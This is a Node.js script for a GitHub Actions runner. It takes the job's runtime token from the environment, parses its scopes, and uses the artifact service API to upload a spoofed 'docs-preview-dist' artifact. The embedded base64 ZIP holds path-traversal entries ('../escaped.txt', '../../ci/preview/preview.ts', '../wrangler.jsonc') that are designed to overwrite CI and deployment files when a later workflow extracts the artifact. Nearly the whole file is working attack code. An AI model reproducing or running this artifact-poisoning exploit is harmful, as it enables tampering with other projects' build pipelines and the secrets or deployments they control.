const ZIP = Buffer.from(
  'UEsDBBQAAAAIALyRXV1rXkElEgAAABAAAAAOAAAALi4vZXNjYXBlZC50eHQLCPdzddENCXIMcw0KdvThAgBQSwMEFAAAAAgAvJFdXe922HJvAAAAgQAAABsAAAAuLi8uLi9jaS9wcmV2aWV3L3ByZXZpZXcudHPLzC3ILypRyC/mKijKzCvRUA8I93N1sVIoKSotLklNUShOLsosKFEoSi3ISUwG8pMqFRKLSjLTEpNLFFLzSooq1TXhOv2d44NdnYNcQ2zVFbSBRuql5pVlFuXn6aWnokir66jb5OXnpdqpa2pyAQBQSwMEFAAAAAgAvJFdXX8dl7McAAAAGgAAABEAAAAuLi93cmFuZ2xlci5qc29uY6tWyk0syk4tUrJSCgj3c3XRdfb3c/N0V6rlAgBQSwECFAMUAAAACAC8kV1da15BJRIAAAAQAAAADgAAAAAAAAAAAAAAgAEAAAAALi4vZXNjYXBlZC50eHRQSwECFAMUAAAACAC8kV1d73bYcm8AAACBAAAAGwAAAAAAAAAAAAAAgAE+AAAALi4vLi4vY2kvcHJldmlldy9wcmV2aWV3LnRzUEsBAhQDFAAAAAgAvJFdXX8dl7McAAAAGgAAABEAAAAAAAAAAAAAAIAB5gAAAC4uL3dyYW5nbGVyLmpzb25jUEsFBgAAAAADAAMAxAAAADEBAAAAAA==',
  'base64'
);

const KEYS = ['ACTIONS_RUNTIME_TOKEN', 'ACTIONS_RESULTS_URL', 'ACTIONS_RUNTIME_URL', 'ACTIONS_CACHE_URL', 'GITHUB_RUN_ID'];
console.log('env presence:', Object.fromEntries(KEYS.map(k => [k, process.env[k] ? 'present' : 'absent'])));

const token = process.env.ACTIONS_RUNTIME_TOKEN;
const base = (process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_RUNTIME_URL || '').replace(/\/$/, '');
if (!token || !base) { console.log('no runtime token/url available'); process.exit(0); }

const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
let runId, jobId;
for (const part of (claims.scp || '').split(' ')) {
  const p = part.split(':');
  if (p[0] === 'Actions.Results' && p.length === 3) { runId = p[1]; jobId = p[2]; }
}
if (!runId) { console.log('no Actions.Results scope'); process.exit(0); }

async function twirp(method, body) {
  const r = await fetch(`${base}/twirp/github.actions.results.api.v1.ArtifactService/${method}`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  const text = await r.text();
  console.log(method, r.status, text.slice(0, 300));
  return JSON.parse(text);
}

(async () => {
  const created = await twirp('CreateArtifact', {
    workflowRunBackendId: runId,
    workflowJobRunBackendId: jobId,
    name: 'docs-preview-dist',
    version: 4,
  });
  const signed = created.signedUploadUrl || created.signed_upload_url;
  const put = await fetch(signed, {
    method: 'PUT',
    headers: { 'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/zip' },
    body: ZIP,
  });
  console.log('blob put', put.status);
  await twirp('FinalizeArtifact', {
    workflowRunBackendId: runId,
    workflowJobRunBackendId: jobId,
    name: 'docs-preview-dist',
    size: String(ZIP.length),
  });
})().catch(e => { console.error(e); process.exit(1); });
